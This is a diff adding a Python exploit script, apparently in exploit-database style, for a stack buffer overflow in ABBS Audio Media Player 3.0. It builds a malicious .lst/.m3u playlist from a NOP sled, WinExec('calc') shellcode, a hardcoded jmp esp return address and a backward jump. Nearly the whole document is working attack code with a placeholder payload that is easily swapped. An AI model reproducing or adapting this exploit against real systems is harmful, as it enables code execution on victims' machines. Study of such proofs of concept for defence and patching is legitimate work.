@@ -1,0 +1,43 @@
+# Exploit: ABBS Audio Media Player Buffer Overflow Exploit (M3U/LST)
+# Date: 14.03.11
+# Author: Rh0 (Rh0[at]z1p.biz)
+# Software Link: http://abbs.qsnx.net/downloads/abbs-amp.zip
+# Version: 3.0
+# Tested on: WinXP Pro SP3 EN (VirtualBox)
+
+print "[*] Stack buffer overflow in ABBS Audio Media Player 3.0 [*]"
+bufferlen = 4108;				# buffer until return address overwrite
+nops = "\x90" * 5;
+## WinExec("calc",1)
+shellcode = (
+		"\x33\xC0"			# xor eax,eax
+		"\x50"				# push eax
+		"\x68\x63\x61\x6C\x63"		# push 'calc'
+		"\x8B\xDC"			# mov ebx, esp
+		"\xB0\x01"			# mov al, 1
+		"\x50"				# push eax
+		"\x53"				# push ebx
+		"\xB8\x0C\x25\x86\x7C"		# mov eax, 7C86250C
+		"\x04\x01"			# add al, 1
+		"\xFF\xD0"			# call eax (WinExec@kernel32.dll)
+		)
+			
+ret = "\x87\xa7\xa7\x7c";			# jmp esp @user32.dll (0x7ca7a787)
+esp = "\xe9\xeb\xef\xff\xff";	# jmp backwards 4116 bytes
+
+buffer  = nops
+buffer += shellcode
+buffer += "A" * (bufferlen - len(buffer))
+buffer += ret;
+buffer += esp;
+
+try:
+	A = open("exploit.lst","wb")		# exploit works also with .m3u
+	A.write(buffer)
+	A.close()
+	print "[*] exploit.lst created [*]"
+except:
+	print "[*] Error while creating file [*]"
+
+print "[*] Enter to continue.. [*]"
+raw_input()
